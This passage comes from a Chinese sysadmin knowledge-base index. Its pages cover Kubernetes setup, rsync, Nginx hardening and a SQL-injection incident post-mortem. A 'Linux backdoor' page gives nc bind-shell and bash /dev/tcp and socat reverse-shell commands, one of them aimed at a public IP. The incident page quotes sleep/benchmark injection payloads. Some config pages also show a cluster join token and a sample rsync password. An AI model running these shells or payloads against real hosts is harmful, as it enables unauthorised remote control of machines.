Plugin：kubernetes部署插件，可根据需要使用 http://jenkins访问url/updateCenter/ 查看插件安装进度 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"K8S/安装K8S.html":{"url":"K8S/安装K8S.html","title":"安装K8S","keywords":"","body":"系统初始化： 设置主机名 hostnamectl set-hostname k8s-master001 mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/Cent* /etc/yum.repos.d/bak/ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # 安装依赖包 yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wgetvimnet-tools git swapoff -a && sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab setenforce 0 && sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config cat > kubernetes.conf /etc/systemd/journald.conf.d/99-prophet.conf kubeadm 部署 docker 安装 yum install -y yum-utils device-mapper-persistent-data lvm2 ### 新增 Docker 仓库 yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo ## 安装 Docker CE. yum update && yum -y install docker-ce-18.06.2.ce ## 创建 /etc/docker 目录。 mkdir /etc/docker # 设置 daemon。 cat > /etc/docker/daemon.json 集群部署 cat /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF yum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes systemctl enable --now kubelet # 查看初始化默认配置 kubeadm config print init-defaults > kubeadm-config.yaml kubeadm init --kubernetes-version=v1.18.1 \\ --apiserver-advertise-address=172.16.5.30 \\ --image-repository registry.aliyuncs.com/google_containers \\ --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16 | tee kubeadm-init.log 节点加入集群 mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config # 根据提示加入 kubeadm join 172.16.5.30:6443 --token hjqed5.0ueiyniog0pzls6p \\ --discovery-token-ca-cert-hash sha256:c54d339dad7b57d7e1a2e9b5a0aded876b16a4e1eae4be1848f4d38864e804fa # 此时通过kubectl get node 状态是notready，需要安装网络插件 flannel kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 取消污点，允许master部署pod kubectl taint nodes --all node-role.kubernetes.io/master- 禁止master部署pod kubectl taint nodes k8s node-role.kubernetes.io/master=true:NoSchedule kubectl taint nodes k8s kubernetes.io/hostname=k8s-master001 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"K8S/建立普通User.html":{"url":"K8S/建立普通User.html","title":"建立普通User","keywords":"","body":"创建用户客户端 # 创建一个用户秘钥 openssl genrsa -out dev.key 2048 # 生成用户等的csr文件 openssl req -new -key dev.key -out dev.csr -subj \"/CN=dev/O=dev\" # 创建用户的私钥 openssl x509 -req -in dev.csr -CA ./ca.crt -CAkey ./ca.key -CAcreateserial -out dev.crt -days 1000 # 集群内创建用户和生成kubeconfig kubectl config set-credentials dev --client-certificate=dev.crt --client-key=dev.key kubectl config set-context dev-context --cluster=kubernetes --namespace=kube-system --user=dev 给用户赋只读权限 apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: dev-role rules: - apiGroups: [\"*\"] resources: [\"*\"] verbs: [\"get\", \"list\", \"watch\"] --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: dev-rolebinding subjects: - kind: User name: dev apiGroup: \"dev\" roleRef: kind: ClusterRole name: dev-role apiGroup: \"\" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"K8S/网络通信.html":{"url":"K8S/网络通信.html","title":"网络通信","keywords":"","body":"pod内多个容器通信： pod内共用pause网络栈，所以可以通过lo localhost网络通信 pod间通信： overlay网络通信，google提供了cni接口，最常用的是flannel pod与service通信： 通过iptables或lvs规则转发 垮主机的pod通信： 源容器 --> docker0 --> flannel0 --> flanneld --> 容器2机器上的flanneld -->flannel0 --> docker0 --> 目标容器IP Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"K8S/零中断滚动更新.html":{"url":"K8S/零中断滚动更新.html","title":"零中断滚动更新","keywords":"","body":"面临的问题 现互联网公司开发节奏较快，线上应用迭代非常频繁，特殊情况下同一个服务甚至面临着每天(非夜间)N次发布，那么频繁发布时如何保障线上稳定性变得尤为重要 了解Pod销毁流程的意义 想要实现零中断发布，理解如何干净的关闭一个Pod中运行的应用很重要，因为在发布过程中你的应用一定会面临关闭、启动的过程 比如应用关闭的时候，你如何确保已经转发到应用中处理的请求都已经正常处理完成或者关闭了呢？ Pod销毁流程 在进行应用发布时应该怎么做 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"Linux/":{"url":"Linux/","title":"Linux","keywords":"","body":"Linux常用操作 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Linux/kali/":{"url":"Linux/kali/","title":"Kali","keywords":"","body":"Kali Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"Linux/kali/扫描.html":{"url":"Linux/kali/扫描.html","title":"扫描","keywords":"","body":"fping -g 192.168.1.0/24 -a -q | tee 1host Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"Linux/LInux后门/":{"url":"Linux/LInux后门/","title":"LInux后门","keywords":"","body":"Linux后门权限维持 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"Linux/LInux后门/shell反弹.html":{"url":"Linux/LInux后门/shell反弹.html","title":"shell反弹","keywords":"","body":"nc反弹 安装原生版本的nc wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz tar xf netcat-0.7.1.tar.gz cd netcat-0.7.1 # 执行编译需要gcc环境 ./configure --prefix=/usr/local/ncat make -j 2 && make install ln -s /usr/local/ncat/bin/nc /usr/bin/nc 场景一：被攻击机和攻击机在同一个网络中时 被攻击机开启监听，并将bash发布出去 nc -lvvp 8080 -t -e /bin/bash 攻击机上直接连接目标主机的8080端口 nc 192.168.31.41 8080 场景二：被攻击机和攻击机在不同网络中时，比如被攻击机身处内网没有公网IP 攻击机上开启8080监听, 等待shell反弹 nc -lvvp 8080 被攻击机上使用一句话反弹shell bash -i >& /dev/tcp/211.149.240.203/8080 0>&1 此时攻击机上已经接受到了shell，攻击机上执行ip add命令验证ip socat 反弹shell socket cat，基于socket，可以看做是ncat的加强版 socat命令下载链接，下载后直接放置/usr/local/bin目录即可使用 https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat 肉鸡没有公网IP的情况 反弹shell 1、攻击机上开启监听 socat TCP-LISTEN:5555 - 2、被攻击机机上运行socat反弹shell(表示将shell反弹到192.168.1.101的12345端口) socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.101:5555 3、攻击机上已经获取到shell，可以直接iP add等命令查看 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"Linux/rsync_inotify/":{"url":"Linux/rsync_inotify/","title":"Rsync Inotify","keywords":"","body":"rsync 本篇内容名词： rsync服务端: 用于接收同步 客户端： 推送到服务器端 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"Linux/rsync_inotify/rsync+inofity实时同步.html":{"url":"Linux/rsync_inotify/rsync+inofity实时同步.html","title":"rsync+inofity实时同步","keywords":"","body":"rsync 本篇内容名词： rsync服务端: 用于接收同步 客户端： 推送到服务器端 后续内容会实时将客户端的/usr/local/nginx目录推送到服务端 配置rsync服务端置服务端（接收同步数据的机器） centos默认安装了rsync的rpm包 在同步源机器编辑 vim /etc/rsyncd.conf uid = root gid = root use chroot = yes # address = 172.16.2.155 port 873 log file = /var/log/rsyncd.log pid file = /var/run/rsyncd.pid hosts allow = 172.16.0.0/16 read only = no [nginxroot] path = /root/ansible dont compress = *.gz *.zip *.bz2 *.rar *.z *.tar auth users = backuper secrets file = /etc/rsyncd_users.db 2、编辑用户验证文件 echo 'backuper:pwd@123' > /etc/rsyncd_users.db 3、设置权限 chmod 600 /etc/rsyncd_users.db 3、启动rsync rsync --daemon 查看是否成功启动 netstat -anpt | grep rsync 重启rsync服务命令： kill cat /var/run/rsyncd.pid rsync --daemon 客户端配置： 1、创建密码文件 echo 'pwd@123' > /etc/rsync.pass chmod 600 !$ 2、测试将本地目录推送到server端 rsync -az --delete --exclude \"logs\" /usr/local/nginx/ backuper@172.16.31.109::nginxroot --password-file=/etc/rsync.pass 3、安装inotify并测试 # 结合inotify，安装inotify包 yum install inotify-tools -y # 监控/backup目录的的状态变更 inotifywait -mrq -e modify,create,move,delete --exclude=\"logs/\" /usr/local/nginx 4、 自动运行脚本 #!/bin/bash inotifywait -mrq -e modify,create,move,delete --exclude=\"logs\" /usr/local/nginx | while read DIRECTORY EVENT FILE do if [ `pgrep rsync | wc -l` -le 0 ];then rsync -avz --delete --exclude=\"logs\" /usr/local/nginx/ backuper@172.16.31.109::nginxroot --password-file=/etc/rsync.pass fi echo '1' done Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"Linux/nmcli配置网络.html":{"url":"Linux/nmcli配置网络.html","title":"nmcli配置网络","keywords":"","body":"查看网卡信息 ```nmcli connection NAME UUID TYPE DEVICE ens33 a92fa07b-9b68-4d2b-a2e7-e55146099b1b ethernet ens33 ens36 418da202-9a8c-b73c-e8a1-397e00f3c6b2 ethernet ens36 nmcli con xxx ``` 显示具体的网络接口信息 nmcli connection show xxx 显示所有活动连接 nmcli connection show --active 删除一个网卡连接 nmcli connection delete xxx 给xxx添加一个IP（IPADDR） nmcli connection modify xxx ipv4.addresses 192.168.0.58 给xxx添加一个子网掩码（NETMASK） nmcli connection modify xxx ipv4.addresses 192.168.0.58/24 IP获取方式设置成手动（BOOTPROTO=static/none） nmcli connection modify xxx ipv4.method manual 添加一个ipv4 nmcli connection modify xxx +ipv4.addresses 192.168.0.59/24 删除一个ipv4 nmcli connection modify xxx -ipv4.addresses 192.168.0.59/24 添加DNS nmcli connection modify xxx ipv4.dns 114.114.114.114 删除DNS nmcli connection modify xxx -ipv4.dns 114.114.114.114 添加一个网关（GATEWAY） nmcli connection modify xxx ipv4.gateway 192.168.0.2 可一块写入： nmcli connection modify xxx ipv4.dns 114.114.114.114 ipv4.gateway 192.168.0.2 使用nmcli重新回载网络配置 nmcli c reload 如果之前没有xxx的connection，则上一步reload后就已经自动生效了 nmcli c up xxx Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Linux/添加systemd服务.html":{"url":"Linux/添加systemd服务.html","title":"添加systemd服务","keywords":"","body":"/usr/lib/systemd/system 中添加${serviceName}.service文件。写入 [Unit] Description=srerobot #必填 After=network.target [Service] Type=simple # User=root # Group=root # Environment=LD_LIBRARY_PATH=/usr/local/miniconda3/lib:$LD_LIBRARY_PATH #环境变量,特殊场景才需要申明 PIDFile=/var/log/srerebot.pid #pid文件 ExecStart=/usr/local/python3.8/bin/python3.8 /usr/local/python3.8/scripts/SrePrince/bin/sreprince.py #启动命令 ExecStop=/bin/kill -TERM $MAINPID TimeoutStopSec=5 KillMode=mixed Restart=always # 托管重启 LimitNOFILE=100000 LimitNPROC=100000 [Install] WantedBy=multi-user.target 生效 systemctl daemon-reload systemctl start ${service_name} systemctl status ${service_name} systemctl restart ${service_name} ExecStart处必须写绝对路径 一键生成一个名为v2r的服务示例 tsname='v2r' cat > /usr/lib/systemd/system/${tsname}.service [Unit] Description=${tsname} After=network.target [Service] Type=simple PIDFile=/var/log/${tsname}.pid ExecStart=/data/soft/XrayR --config /data/soft/config.yml TimeoutStopSec=5 KillMode=mixed Restart=always LimitNOFILE=100000 LimitNPROC=100000 [Install] WantedBy=multi-user.target EOF ## 启动 systemctl daemon-reload systemctl enable ${tsname} --now systemctl status ${tsname} Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-16 02:27:58 "},"Linux/自建NAT网关.html":{"url":"Linux/自建NAT网关.html","title":"自建NAT网关","keywords":"","body":"NAT网关配置 打开转发功能 echo 'net.ipv4.ip_forward = 1' >> /etc/sysctl.conf sysctl -p ` 配置iptables 配置nat表，所有来源通过192.168.16.70这个IP代理出去 iptables -t nat -I POSTROUTING -s 0.0.0.0/0 -j SNAT --to-source 192.168.16.70 客户端配置 其他主机默认路由指向NAT Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-12 04:02:54 "},"Mysql/":{"url":"Mysql/","title":"Mysql","keywords":"","body":"Mysql Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-28 03:23:46 "},"Mysql/一次被SQL注入的经历.html":{"url":"Mysql/一次被SQL注入的经历.html","title":"一次被SQL注入的经历","keywords":"","body":"现象 数据库的CPU负载高，导致大量会话堆积，从而引发线上查询缓慢 排查问题 1、优先恢复业务原则，立刻对MySQL进行了扩容。扩容后恢复正常 2、开始溯源，分析故障时间段内的慢SQL、每个客户端的会话链接情况、较慢SQL执行次数和sql样本等。发现账号名为nginx_proxy的用户在执行如下sql select sleep(30)-- fgkl' OR second_domain = 'a.com';select sleep(30)-- fgkl' OR one_key_domain = 'a.com';select sleep(30)-- fgkl' LIMIT 1 3、select sleep指令比较经典的用于探测SQL注入的测试命令 4、已知客户端IP和账号，定位到客户端为一台nginx服务器里面嵌入的Lua脚本，Lua脚本里执行了如下图的查库操作，并没有使用ORM框架，而是通过提取http host拼接的sql local cms_domain = http_host local sql = string.format(\"SELECT cms_domain,uid FROM dtk_user_config WHERE cms_domain='%s' OR second_domain = '%s' LIMIT 1\", cms_domain, cms_domain) 尝试复现问题 成功注入，并执行了压测 原理： 假设Host为a.com or 9576=benchmark(30000,md5(0x41536f79))-- sss时，拼接出的sql是select uid from table where cms_domain='a.com or 9576=benchmark(30000,md5(0x41536f79))-- sss' 这是无法执行的，而图中通过写入一个单引号，然后再最后添加-- 注释，使string.fotmat中的引号失效，所以拼接出sql是select uid from table where cms_domain='a.com' or 9576=benchmark(30000,md5(0x41536f79))实现了注入 修复 1、改用ORM查库 2、加入通过正则对host进行过滤后合法后再提交查询 local domainok, err = ngx_re_match(http_host,\"^(?=^.{3,255}$)[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\\\\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+$\",\"jo\") if not domainok then ngx_say(\"非法已记录\") return end 总结 这是一个低级的错误导致的SQL注入问题，现在框架中已经基本屏蔽了这些问题，这是使用字符直接拼接的sql，所以爆发了这个sql注入 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-28 03:23:46 "},"Nginx/":{"url":"Nginx/","title":"Nginx","keywords":"","body":"Nginx 调优 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/Lua/":{"url":"Nginx/Lua/","title":"Lua","keywords":"","body":"Lua Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"Nginx/Lua/1.执行阶段.html":{"url":"Nginx/Lua/1.执行阶段.html","title":"1.执行阶段","keywords":"","body":" rewrite_by_lua: 转发、重定向、缓存等功能(例如特定请求代理到外网) access_by_lua: IP 准入、接口权限等情况集中处理(例如配合 iptable 完成简单防火墙) content_by_lua: 内容生成 header_filter_by_lua: 响应头部过滤处理(例如添加头部信息) body_filter_by_lua: 响应体过滤处理(例如完成应答内容统一成大写) log_by_lua: 会话完成后本地异步完成日志记录(日志可以记录在本地，还可以同步到其他机器) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-05 02:14:29 "},"Nginx/Lua/常用语法demo.html":{"url":"Nginx/Lua/常用语法demo.html","title":"常用语法demo","keywords":"","body":"基础申明 下文中的模块简写依赖这里的命名 local cjson = require \"cjson\" local ngx_log = ngx.log local ngx_err = ngx.ERR local redis = require \"resty.redis\" local uri = ngx.var.uri local red = redis:new() local args = ngx.req.get_uri_args() 函数申明 local mess_return = function(mess, s) if s == nil then ngx.status = 200 else ngx.status = s end ngx_say(cjson.encode(mess)) ngx.exit(0) end -- 调用mess_return函数 if not appkey then local mess = {} mess[\"message\"] = \"appkey不存在\" mess_return(mess, 439) end if判断语法 基础判断 if not appKey then -- logic else -- logic end uid[1]是userdata类型，不能直接和lua自带的nil对比。json中的value如果是null， 经过cjson.decode以后，该value的类型就是userdata，值是ngx.null ， 如果强制转换为字符串，则打印出来的内容是“userdata: null”， 所以decode之后，判断value是否为空的时候，需要和ngx.null比较 if uid[1] == ngx.null then local mess = {} mess[\"message\"] = \"appkey不存在\" mess_return(mess, 439) end table 循环 for k,v in pairs(table) do -- logic end redis 操作 -- redis初始化 red:set_timeout(100) local red_option = {} red_option[\"pool_size\"] = 50 red_option[\"backlog\"] = 100 local ok, err = red:connect(\"r-2zejf1hgj2eej5br0x.redis.rds.aliyuncs.com\", 6379, red_option) -- 链接失败则正常退出，让nginx继续执行后面的流程 if not ok then ngx.exit(0) end local find_uid = function() local res, err = red:hmget(mdw_prefix .. ':' .. appkey, \"uid\") if res then -- 成功则放入长链接 local r, err = red:set_keepalive(100000, 50) return res else local mess = {} mess[\"message\"] = \"appkey不存在\" mess_return(mess, 439) end end -- 调用函数查询redis local uid = find_uid() 获取nginx参数 -- 获取host local domain = http_host -- 获取接口 if uri == \"/query_new\" then -- logic end -- 获取uri参数 if args[\"appKey\"] then -- logic end lua里重置nginx变量 ngx.var.cmspassto = 'cmsnew' lua HTTP请求 ngx.var.cmspassto = 'cmsnew' local json = require \"cjson.safe\" local http = require \"resty.http\" local httpc = http:new() local get_vipstatus = function(appid) check_vip_uri=\"/xxxxx/cms/v1/user-server-status?appId=\" .. appid local resp,err = httpc:request_uri(\"http://xxx.fquan.cn\", { method = \"GET\", path=check_vip_uri }) if resp.status >= 500 then ngx.say('upstream check vip api error') end if not resp then ngx.say(\"query vip status err:\",err) return end res = resp.body -- ngx.log(ngx.ERR, \"接收结果打印完成==================================\") -- 解json res_json = json.decode(res) vipstatus = res_json[\"data\"][\"is_vip\"] if vipstatus then cms_domain_vipstatus_mem:set(appid,vipstatus,300) return vipstatus end ngx.log(ngx.ERR, 'vipstatus 为空') return end if appid then local vipstatus = cms_domain_vipstatus_mem:get(appid) if vipstatus == 1 or vipstatus == '1' then -- 修改nginx里的后端变量，nginx里set $cmspassto 'varnish_servers';了这个变量 ngx.var.cmspassto = 'cmsnew' else ngx.var.cmspassto = 'cms' end end Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"Nginx/1.Nginx安全策略.html":{"url":"Nginx/1.Nginx安全策略.html","title":"1.Nginx安全策略","keywords":"","body":"优化链接参数 优化前 优化后 参数说明 worker_processes 1; worker_processes auto; 进程数 worker_connections 1024; worker_connections 65535; 每个进程允许的最多链接 安全策略优化 禁止空主机头访问 禁止IP直接访问，防止非法域名直接解析到IP上 # 禁止使用IP直接访问，返回403错误码 server { listen 80 default; server_name _; return 403; } #server_name处定义允许访问的域名，将80端口的http请求转发到https server { listen 80; server_name www.itgod.org itgod.org; rewrite ^(.*)$ https://$host$1 permanent; 禁止目录浏览 在Http中配置autoindex off;关闭目录浏览 http { include mime.types; default_type application/octet-stream; server_tokens off; include vhost/*.conf; #添加这行 autoindex off; 防盗链配置 只允许referer为空或者referer为信任站点时才能拉取图片 允许referer为空是为了允许浏览器直接访问图片路径 伪造referer很容易，所以此方法只能防止一般的盗链 location ~*\\.(gif|jpg|png|swf|flv|bmp)$ { valid_referers none blocked *.itgod.org itgod.org; if ($invalid_referer) { return 403; } } 隐藏Nginx版本号 屏蔽Nginx版本号，减低被版本漏洞攻击风险，在HTTP下添加一行内容 server_tokens off; 例： http { include mime.types; default_type application/octet-stream; server_tokens off; 封禁指定的url 恶意攻击通常会尝试通过URL执行一些命令，有必要禁用包含一些特殊字符串的链接访问，比如URL中包含.sh old bak sql等关键词，直接进行URL访问限制 location ~*\\.(sh|git|bak|sql|old)$ { return 403; } 系统内核参数优化 vim /etc/sysctl.conf net.ipv4.tcp_max_tw_buckets = 6000 net.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_syncookies = 1 一个Nginx主配置文件示例 以下不包含图片缓存等配置，可以根据自身业务需求再合理添加图片等缓存、日志格式化等 # #user www www; user root root; worker_processes auto; #Specifies the value for maximum file descriptors that can be opened by this process. pcre_jit on; worker_rlimit_nofile 66600; worker_shutdown_timeout 60s; worker_cpu_affinity auto; events { use epoll; worker_connections 66600; } stream { proxy_connect_timeout 3s; include conf.d/tcp/*.conf; } http { error_log /var/log/nginx/error.log; access_log /var/log/nginx/access.log; charset utf-8; include mime.types; default_type application/octet-stream; #proxy_temp_path /var/log/nginx/nginx_cache/proxy_cache/proxy_temp_dir; #proxy_cache_path /var/log/nginx/nginx_cache/proxy_cache/proxy_dir levels=1:2 keys_zone=cache_one:200m inactive=1d max_size=2g; #proxy_cache_use_stale error timeout invalid_header updating http_500 http_502 http_503 http_504 http_404; log_format json '{\"access_time\": \"$time_iso8601\", \"remote_addr\": \"$remote_addr\", \"x-forward-for\": \"$http_x_forwarded_for\", \"method\": \"$request_method\", \"request_url_path\": \"$uri\", \"request_url\": \"$request_uri\", \"status\": $status, \"request_time\": $request_time, \"request_length\": \"$request_length\", \"upstream_host\": \"$upstream_http_host\", \"upstream_response_length\": \"$upstream_response_length\", \"upstream_response_time\": \"$upstream_response_time\", \"upstream_status\": \"$upstream_status\", \"http_referer\": \"$http_referer\", \"remote_user\": \"$remote_user\", \"http_user_agent\": \"$http_user_agent\", \"appkey\": \"$arg_appkey\", \"upstream_addr\": \"$upstream_addr\", \"http_host\": \"$http_host\", \"pro\": \"$scheme\", \"request_id\": \"$request_id\", \"h\": \"$host\"}'; sendfile on; tcp_nopush on; tcp_nodelay on; proxy_next_upstream error http_502 timeout; proxy_next_upstream_tries 2; open_file_cache max=10240 inactive=20s; open_file_cache_valid 30s; open_file_cache_min_uses 1; reset_timedout_connection on; keepalive_timeout 45s; keepalive_requests 2000; client_header_timeout 15s; client_body_timeout 15s; proxy_connect_timeout 5s; variables_hash_max_size 1024; server_tokens off; proxy_intercept_errors on; fastcgi_intercept_errors on; client_header_buffer_size 16k; large_client_header_buffers 4 32k; client_max_body_size 160m; server_names_hash_max_size 1024; server_names_hash_bucket_size 256; gzip on; gzip_min_length 1k; gzip_buffers 16 8k; gzip_comp_level 6; gzip_types text/plain text/css application/x-javascript text/xml application/xml application/xml+rss text/javascript application/json application/javascript; gzip_vary on; gzip_proxied any; proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传递请求，而不缓冲到磁盘 client_body_buffer_size 256k; proxy_buffer_size 64k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 64k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_buffering on; geo $whiteIpList { default 1; 59.110.139.118 0; } map $whiteIpList $binary_remote_addr_limit { 1 $binary_remote_addr; 0 \"\"; } limit_req_zone $http_host zone=open_api_domain:50m rate=2500r/s; limit_req_zone $arg_appkey zone=open_api_appkey:50m rate=200r/s; limit_req_zone $binary_remote_addr zone=zone_web_tmp:50m rate=5r/s; limit_req_zone $binary_remote_addr zone=zone_web:50m rate=50r/s; limit_req_zone $binary_remote_addr zone=zone_web_yjtg:50m rate=30r/s; limit_req_zone $binary_remote_addr_limit zone=zone_open_api:50m rate=40r/s; map $sent_http_cdn_time $expires { default -1; ~^\\d+$ $sent_http_cdn_time; } more_clear_headers Pragma; set_real_ip_from 0.0.0.0/0; real_ip_header X-Forwarded-For; real_ip_recursive on; expires $expires; more_set_headers \"Upstream-Name2: $proxy_host\"; lua_package_path \"${prefix}conf/conf.d/lrc4/?.lua;/opt/nginx/lua_modules/?.lua;/opt/nginx/lua/?.lua;/opt/nginx/lua_modules/?.lua;/opt/nginx/lua/?.lua;;\"; lua_shared_dict domain_mem 10m; lua_shared_dict open_url_mem_min 10m; lua_shared_dict open_appkey_mem_day 10m; lua_shared_dict my_limit_req_store 30m; lua_shared_dict my_limit_req_api 30m; lua_shared_dict cms_domain_mem 10m; lua_shared_dict cms_domain_vipstatus_mem 2m; lua_shared_dict openapiv2_rediskey_mem 50m; lua_socket_log_errors off; # TCP发送失败的时候，会发送error日志到error.log,此过程会有性能开销，建议关闭，避免健康检查中多台机器down了，导致日志一直写入error.log。对于异常的情况请使用ngx.log来记录 lua_shared_dict healthcheck 2m; # 存放upstream servers的共享内存，upstream组越多，配置就越大。 proxy_redirect off ; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Request-Id $request_id; proxy_set_header x-b3-traceid $request_id; resolver 100.100.2.138 100.100.2.136 valid=30s; # 静态化varnish缓存，轮训负载均衡主备 split_clients \"$request_uri\" $proxy_cache { 50% master_cache_servers; * backup_cache_servers; } limit_req_status 429; ssl_certificate conf.d/dtkcert/itgod.org.pem; ssl_certificate_key conf.d/dtkcert/itgod.org.key; include upstream.conf; include conf.d/*.conf; include testconfig/*.conf; include blocksip.conf; } 一个vhosts示例 server { listen 80; listen 443 ssl; server_name itgod.org; ssl_certificate conf.d/dtkcert/itgod.org.cn.pem; ssl_certificate_key conf.d/dtkcert/itgod.org.key; access_log /var/log/nginx/dtkapi.access.log json; error_log /var/log/nginx/dtkapi.error.log; include public/srcache.conf; include public/deny.conf; # 静态容灾实例配置 # set $srcache_v 0; # access_by_lua_file 'conf/conf.d/luascripts/srcache_random.lua'; # if ($uri ~ (/zs/|/pmc/|/pay/)) { # set $srcache_v 2; # } # if ($request_uri ~ \"_=[0-9]{10,13}$\") { # set $srcache_v 2; # } # set_md5 $mem_key $uri$args; # srcache_store PUT /memc $mem_key; # srcache_store_skip $srcache_v; # srcache_store_statuses 200 301 302; # srcache_response_cache_control off; # srcache_methods GET HEAD; # srcache_ignore_content_encoding on; # srcache_max_expire 10h; # # error_page 500 = @down_cache; # error_page 502 = @down_cache; # error_page 503 = @down_cache; # error_page 504 = @down_cache; # location = /memc { # internal; # # memc_connect_timeout 100ms; # memc_send_timeout 100ms; # memc_read_timeout 100ms; # memc_ignore_client_abort on; # # set $memc_key $query_string; # set $memc_exptime 36000; # # memc_pass memcached; # } # location @down_cache { # more_set_headers \"down-memcache: HIT\"; # access_log /var/log/nginx/downcache.dtkapi.dataoke.com.access.log json; # srcache_fetch GET /memc $mem_key; # } underscores_in_headers on; location ~^/dtk-order/ { more_set_headers \"Access-Control-Allow-Origin: *\"; more_set_headers \"Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE\"; more_set_headers \"Access-Control-Allow-Headers: *\"; more_set_headers \"Access-Control-Allow-Credentials: true\"; more_set_headers \"Access-Control-Expose-Headers: Content-Length,Access-Control-Allow-Origin,Access-Control-Allow-Headers,Content-Type\"; rewrite ^/aaaa/(.*) /$1 break; proxy_pass http://aaa; } } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/2.性能优化.html":{"url":"Nginx/2.性能优化.html","title":"2.性能优化","keywords":"","body":"性能优化 file-max 控制系统能打开的句柄数 ulimit 控制进程能打开的句柄数 修改linux单进程最大文件连接数 [root@ebs-41181 nginx]# vim /etc/security/limits.conf ##### 在文件最后加入如下内容 * soft nofile 102400 * hard nofile 102400 配置Nginx进程数量 worker_processes auto; 配置系统最大句柄数量 #当前会话生效 systemctl -w fs.file-max=2000000 #永久生效 echo 'fs.file-max=2000000' >> /etc/sysctl.conf 打开日志buffer缓冲，避免磁盘的频繁写入(以下配置表示日志达到32K后才写入磁盘,如果3秒内日志没有达到32K强制写入磁盘) access_log logs/access.log json buffer=32k flush=3s; 开启后端502重试，upstream池里某个节点502时会转发请求重试 proxy_next_upstream error http_502 timeout; proxy_next_upstream_tries 2; 长链接、打开文件缓存、客户端相关配置 open_file_cache max=10240 inactive=20s; open_file_cache_valid 30s; open_file_cache_min_uses 1; reset_timedout_connection on; keepalive_timeout 45s; keepalive_requests 2000; client_header_timeout 15s; client_body_timeout 15s; proxy_connect_timeout 5s; variables_hash_max_size 1024; server_tokens off; proxy_intercept_errors on; fastcgi_intercept_errors on; client_header_buffer_size 16k; large_client_header_buffers 4 32k; client_max_body_size 160m; server_names_hash_max_size 1024; server_names_hash_bucket_size 256; 打开gzip压缩，节约传输流量 gzip on; gzip_min_length 1k; gzip_buffers 16 8k; gzip_comp_level 6; gzip_types text/plain text/css application/x-javascript text/xml application/xml application/xml+rss text/javascript application/json application/javascript; gzip_vary on; gzip_proxied any; 去除客户顿啊header头中的Connection，指定为http1.1的长链接 proxy_redirect off ; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_set_header Host $host; 代理到后端时添加header头，获取客户端真实IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 